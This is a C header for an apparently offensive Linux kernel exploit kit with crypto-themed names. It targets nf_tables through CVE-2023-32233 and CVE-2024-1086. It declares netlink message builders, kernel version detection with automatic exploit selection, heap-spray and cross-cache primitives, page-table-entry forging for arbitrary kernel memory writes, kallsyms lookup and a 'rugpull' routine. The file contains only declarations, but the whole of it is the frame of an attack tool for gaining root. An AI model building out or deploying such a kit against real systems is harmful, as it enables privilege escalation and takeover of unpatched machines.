#ifndef NFTTABLES_H
#define NFTTABLES_H

#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <linux/netlink.h>

/* ── exploit IDs ───────────────────────────────────────────────── */

#define MINT_AUTO            0
#define MINT_CVE_2023_32233  1  /* anonymous set UAF */
#define MINT_CVE_2024_1086   2  /* verdict double-free */

/* ── nfnetlink constants ───────────────────────────────────────── */
/* defined here so we don't depend on kernel header version */

#define NFNL_SUBSYS_NFTABLES  10
#define NFNETLINK_V0          0

#define NFNL_MSG_BATCH_BEGIN  NLMSG_MIN_TYPE
#define NFNL_MSG_BATCH_END    (NLMSG_MIN_TYPE + 1)

#define NFPROTO_UNSPEC  0
#define NFPROTO_INET    1
#define NFPROTO_IPV4    2
#define NFPROTO_IPV6    10

#ifndef NETLINK_NETFILTER
#define NETLINK_NETFILTER 12
#endif

/* ── nf_tables message types (lower 8 bits of nlmsg_type) ────── */

#define NFT_MSG_NEWTABLE     0
#define NFT_MSG_GETTABLE     1
#define NFT_MSG_DELTABLE     2
#define NFT_MSG_NEWCHAIN     3
#define NFT_MSG_GETCHAIN     4
#define NFT_MSG_DELCHAIN     5
#define NFT_MSG_NEWRULE      6
#define NFT_MSG_GETRULE      7
#define NFT_MSG_DELRULE      8
#define NFT_MSG_NEWSET       9
#define NFT_MSG_GETSET      10
#define NFT_MSG_DELSET      11
#define NFT_MSG_NEWSETELEM  12
#define NFT_MSG_GETSETELEM  13
#define NFT_MSG_DELSETELEM  14

/* ── nf_tables attributes ─────────────────────────────────────── */

/* table */
#define NFTA_TABLE_NAME   1
#define NFTA_TABLE_FLAGS  2

/* chain */
#define NFTA_CHAIN_TABLE   1
#define NFTA_CHAIN_HANDLE  2
#define NFTA_CHAIN_NAME    3
#define NFTA_CHAIN_HOOK    4
#define NFTA_CHAIN_POLICY  5
#define NFTA_CHAIN_USE     6
#define NFTA_CHAIN_TYPE    7
#define NFTA_CHAIN_FLAGS   10

/* hook */
#define NFTA_HOOK_HOOKNUM   1
#define NFTA_HOOK_PRIORITY  2

/* set */
#define NFTA_SET_TABLE      1
#define NFTA_SET_NAME       2
#define NFTA_SET_FLAGS      3
#define NFTA_SET_KEY_TYPE   4
#define NFTA_SET_KEY_LEN    5
#define NFTA_SET_DATA_TYPE  6
#define NFTA_SET_DATA_LEN   7
#define NFTA_SET_POLICY     8
#define NFTA_SET_ID        16
#define NFTA_SET_HANDLE    17

/* set element list */
#define NFTA_SET_ELEM_LIST_TABLE     1
#define NFTA_SET_ELEM_LIST_SET       2
#define NFTA_SET_ELEM_LIST_ELEMENTS  3
#define NFTA_SET_ELEM_LIST_SET_ID    4

/* set element */
#define NFTA_SET_ELEM_KEY    1
#define NFTA_SET_ELEM_DATA   2
#define NFTA_SET_ELEM_FLAGS  3

/* list */
#define NFTA_LIST_ELEM  1

/* data */
#define NFTA_DATA_VALUE    1
#define NFTA_DATA_VERDICT  2

/* verdict */
#define NFTA_VERDICT_CODE   1
#define NFTA_VERDICT_CHAIN  2

/* rule */
#define NFTA_RULE_TABLE        1
#define NFTA_RULE_CHAIN        2
#define NFTA_RULE_HANDLE       3
#define NFTA_RULE_EXPRESSIONS  4

/* expression */
#define NFTA_EXPR_NAME  1
#define NFTA_EXPR_DATA  2

/* immediate expression */
#define NFTA_IMMEDIATE_DREG  1
#define NFTA_IMMEDIATE_DATA  2

/* registers */
#define NFT_REG_VERDICT  0

/* set flags */
#define NFT_SET_ANONYMOUS   0x1
#define NFT_SET_CONSTANT    0x2
#define NFT_SET_INTERVAL    0x4
#define NFT_SET_MAP         0x8

/* data types */
#define NFT_DATA_VALUE_T    0
#define NFT_DATA_VERDICT_T  0xffffff00UL

/* verdict codes */
#define NF_DROP       0
#define NF_ACCEPT     1
#define NF_STOLEN     2
#define NF_QUEUE      3
#define NF_REPEAT     4
#define NFT_CONTINUE  ((uint32_t)-1)
#define NFT_BREAK     ((uint32_t)-2)
#define NFT_JUMP      ((uint32_t)-3)
#define NFT_GOTO      ((uint32_t)-4)
#define NFT_RETURN    ((uint32_t)-5)

/* hook numbers */
#define NF_INET_PRE_ROUTING   0
#define NF_INET_LOCAL_IN      1
#define NF_INET_FORWARD       2
#define NF_INET_LOCAL_OUT     3
#define NF_INET_POST_ROUTING  4

/* priorities */
#define NF_IP_PRI_FILTER  0

/* NLA */
#ifndef NLA_F_NESTED
#define NLA_F_NESTED  (1 << 15)
#endif

#ifndef NLA_ALIGNTO
#define NLA_ALIGNTO   4
#endif
#ifndef NLA_ALIGN
#define NLA_ALIGN(x)  (((x) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
#endif
#ifndef NLA_HDRLEN
#define NLA_HDRLEN    ((int)NLA_ALIGN(sizeof(struct nlattr)))
#endif

#ifndef NLMSG_ALIGNTO
#define NLMSG_ALIGNTO 4
#endif
#ifndef NLMSG_ALIGN
#define NLMSG_ALIGN(len)  (((len) + NLMSG_ALIGNTO - 1) & ~(NLMSG_ALIGNTO - 1))
#endif
#ifndef NLMSG_HDRLEN
#define NLMSG_HDRLEN  ((int)NLMSG_ALIGN(sizeof(struct nlmsghdr)))
#endif

/* ── nfgenmsg (nfnetlink header after nlmsghdr) ───────────────── */

struct nfgenmsg {
    uint8_t  nfgen_family;
    uint8_t  version;
    uint16_t res_id;
};

#define NFGENMSG_LEN  NLMSG_ALIGN(sizeof(struct nfgenmsg))

/* ── batch context for constructing netlink messages ──────────── */

#define NFT_BATCH_BUFSZ  (1 << 16)

struct nft_batch {
    uint8_t          buf[NFT_BATCH_BUFSZ];
    uint32_t         len;
    struct nlmsghdr *cur;      /* current message being built */
    uint32_t         seq;
    int              fd;
};

/* ── kernel info ──────────────────────────────────────────────── */

struct kernel_info {
    int      major;
    int      minor;
    int      patch;
    char     release[256];
    char     distro[128];
    bool     nft_available;
    bool     userns_available;
};

#define KVER(ma, mi, pa)  (((ma) << 16) | ((mi) << 8) | (pa))
#define KVER_OF(ki)       KVER((ki)->major, (ki)->minor, (ki)->patch)

/* ── wallet (privilege state) ─────────────────────────────────── */

struct wallet {
    uid_t    uid, euid;
    gid_t    gid, egid;
    int      ngroups;
    gid_t    groups[64];
    char     hostname[64];
};

/* ── spray primitives (spray.c) ───────────────────────────────── */

#define MAX_SPRAY_QUEUES 512
#define MAX_SPRAY_PIPES  512
#define MAX_SPRAY_SKB    256
#define MAX_SPRAY_KEYS   256

struct msg_spray {
    int      qids[MAX_SPRAY_QUEUES];
    int      count;
    int      allocated;
    int      msgs_per_queue;
    size_t   msg_size;
};

struct pipe_spray {
    int      fds[MAX_SPRAY_PIPES][2];
    int      count;
    int      allocated;
};

struct pte_spray {
    void    *region;
    size_t   region_sz;
    int      npages;
};

struct skb_spray {
    int      sock;
    uint16_t port;
    int      count;
    int      allocated;
    size_t   size;
};

struct key_spray {
    int32_t  serials[MAX_SPRAY_KEYS];
    int      count;
    int      allocated;
};

/* spray.c API */
void spray_msg_init(struct msg_spray *s, int count, size_t msg_size);
int  spray_msg_alloc(struct msg_spray *s, const void *payload, size_t payload_len);
void spray_msg_free_range(struct msg_spray *s, int start, int end);
void spray_msg_free(struct msg_spray *s);

void spray_pipe_init(struct pipe_spray *s, int count);
int  spray_pipe_alloc(struct pipe_spray *s);
int  spray_pipe_read(struct pipe_spray *s, int idx, void *buf, size_t len);
int  spray_pipe_write(struct pipe_spray *s, int idx, const void *buf, size_t len);
void spray_pipe_free(struct pipe_spray *s);

void spray_pte_init(struct pte_spray *s, int npages);
int  spray_pte_alloc(struct pte_spray *s);
int  spray_pte_find_overlap(struct pte_spray *pte, struct pipe_spray *pipes,
                            int *out_pipe_idx);
void spray_pte_free(struct pte_spray *s);

struct slab_info;  /* forward decl, defined in offsets.h */
int  cross_cache_drain(struct msg_spray *primary, struct msg_spray *secondary,
                       const struct slab_info *si);

int  spray_skb_alloc(struct skb_spray *s, int count, size_t size);
void spray_skb_free(struct skb_spray *s);

int  spray_key_alloc(struct key_spray *s, int count, size_t payload_size,
                     const void *payload);
void spray_key_free(struct key_spray *s);

int  spray_xattr(size_t size, int count);

uint64_t forge_pte(uint64_t phys_addr, bool writable, bool usermode);
int  overwrite_via_pte(struct pte_spray *pte, struct pipe_spray *pipes,
                       int pipe_idx, uint64_t target_vaddr,
                       const void *data, size_t len, uint64_t physmap_base);

/* ── global state ─────────────────────────────────────────────── */

struct kernel_offsets;  /* forward decl, defined in offsets.h */

struct nfttables_state {
    int                verbose;
    int                check_only;   /* --check: probe, don't exploit */
    struct kernel_info ki;
    struct wallet      wallet;
};

extern struct nfttables_state G;

/* ── netlink.c ────────────────────────────────────────────────── */

int  nft_socket_open(void);
void nft_batch_init(struct nft_batch *b, int fd);

/* add batch begin/end markers */
void nft_batch_begin(struct nft_batch *b);
void nft_batch_end(struct nft_batch *b);

/* start a new nft message within the batch */
struct nlmsghdr *nft_msg_alloc(struct nft_batch *b, uint16_t msg_type,
                               uint16_t flags, uint8_t family);

/* attribute helpers (operate on b->cur) */
void nft_put_str(struct nft_batch *b, uint16_t type, const char *s);
void nft_put_u32(struct nft_batch *b, uint16_t type, uint32_t val);
void nft_put_u64(struct nft_batch *b, uint16_t type, uint64_t val);
void nft_put_data(struct nft_batch *b, uint16_t type,
                  const void *data, uint16_t len);
void *nft_nest_begin(struct nft_batch *b, uint16_t type);
void  nft_nest_end(struct nft_batch *b, void *start);

/* high-level helpers */
void nft_add_table(struct nft_batch *b, const char *name, uint8_t family);
void nft_del_table(struct nft_batch *b, const char *name, uint8_t family);
void nft_add_chain(struct nft_batch *b, const char *table, const char *name,
                   uint8_t family);
void nft_add_base_chain(struct nft_batch *b, const char *table,
                        const char *name, uint8_t family,
                        uint32_t hooknum, int32_t priority);
void nft_del_chain(struct nft_batch *b, const char *table, const char *name,
                   uint8_t family);
void nft_add_set(struct nft_batch *b, const char *table, const char *name,
                 uint8_t family, uint32_t key_type, uint32_t key_len,
                 uint32_t data_type, uint32_t data_len,
                 uint32_t flags, uint32_t set_id);
void nft_del_set(struct nft_batch *b, const char *table, const char *name,
                 uint8_t family);
void nft_add_set_elem_verdict(struct nft_batch *b, const char *table,
                              const char *set, uint8_t family,
                              const void *key, uint32_t key_len,
                              int32_t verdict_code, const char *chain);
void nft_del_set_elem_verdict(struct nft_batch *b, const char *table,
                              const char *set, uint8_t family,
                              const void *key, uint32_t key_len,
                              int32_t verdict_code, const char *chain);
void nft_add_rule_immediate_verdict(struct nft_batch *b, const char *table,
                                    const char *chain, uint8_t family,
                                    int32_t verdict_code,
                                    const char *target_chain);

/* send batch and check for errors */
int nft_batch_send(struct nft_batch *b);

/* namespace setup */
int  ns_setup_user_net(void);
int  write_file_str(const char *path, const char *data);

/* ── detect.c ─────────────────────────────────────────────────── */

int  detect_kernel(struct kernel_info *ki);
int  pick_exploit(const struct kernel_info *ki);
bool version_in_range(const struct kernel_info *ki,
                      int lo_maj, int lo_min, int lo_pat,
                      int hi_maj, int hi_min, int hi_pat);

/* ── wallet.c ─────────────────────────────────────────────────── */

void wallet_read(struct wallet *w);
void wallet_print(const struct wallet *w, const struct kernel_info *ki);

/* ── exploit entry points ─────────────────────────────────────── */

int mint_cve_2023_32233(const struct kernel_info *ki);
int mint_cve_2024_1086(const struct kernel_info *ki);

/* ── rugpull.c ────────────────────────────────────────────────── */

int rugpull(void);

/* ── kallsyms lookup ──────────────────────────────────────────── */

uint64_t kallsyms_lookup(const char *name);

/* ── CLI theming ──────────────────────────────────────────────── */

#define C_RST   "\033[0m"
#define C_BOLD  "\033[1m"
#define C_DIM   "\033[2m"
#define C_RED   "\033[31m"
#define C_GRN   "\033[32m"
#define C_YEL   "\033[33m"
#define C_CYN   "\033[36m"
#define C_MAG   "\033[35m"

#define PICK   "\xe2\x9b\x8f\xef\xb8\x8f "
#define MINT   "\xf0\x9f\x8e\xa8"
#define OK     "\xe2\x9c\x85"
#define FAIL   "\xe2\x9d\x8c"
#define WARN   "\xe2\x9a\xa0\xef\xb8\x8f "
#define FOX    "\xf0\x9f\xa6\x8a"
#define RUG    "\xf0\x9f\x8f\x83"
#define BROOM  "\xf0\x9f\xa7\xb9"
#define ICON_CHAIN "\xe2\x9b\x93\xef\xb8\x8f "
#define MONKEY "\xf0\x9f\x99\x88"
#define APE    "\xf0\x9f\xa6\x8d"
#define CHART  "\xf0\x9f\x93\x89"
#define BLOCK  "\xf0\x9f\x94\xb2"

#define pr_info(fmt, ...)  fprintf(stderr, fmt "\n", ##__VA_ARGS__)
#define pr_ok(fmt, ...)    fprintf(stderr, OK " " fmt "\n", ##__VA_ARGS__)
#define pr_fail(fmt, ...)  fprintf(stderr, FAIL " " fmt "\n", ##__VA_ARGS__)
#define pr_warn(fmt, ...)  fprintf(stderr, WARN fmt "\n", ##__VA_ARGS__)
#ifdef RELEASE
#define pr_verb(...) do {} while(0)
#else
#define pr_verb(fmt, ...)  do { if (G.verbose) fprintf(stderr, \
                                C_DIM "  " fmt C_RST "\n", ##__VA_ARGS__); } while(0)
#endif

#endif /* NFTTABLES_H */
